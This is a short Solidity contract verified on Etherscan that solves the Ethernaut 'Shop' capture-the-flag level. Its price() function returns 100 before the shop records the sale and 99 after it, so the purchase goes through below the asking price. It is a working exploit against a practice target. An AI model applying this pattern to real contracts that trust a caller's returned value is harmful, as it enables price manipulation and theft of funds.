/**
 *Submitted for verification at Etherscan.io on 2023-03-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external returns (uint);
}

interface IShop {
  function buy() external returns (uint);
  function isSold() external returns (bool);
}

contract Ethernaut is IBuyer {
  bool public entered;

  constructor() {
    // IShop(0xC475903C4A0202E5862D5A5eD3274b58db3e94fD).buy();
  }

  function please() external {
    IShop(0x09dC967aaE714e66D367563e287d3A2d81073006).buy();
  }

  function price() external override returns (uint) {
    if (!IShop(0x09dC967aaE714e66D367563e287d3A2d81073006).isSold()) {
      return 100;
    }
    return 99;
  }
}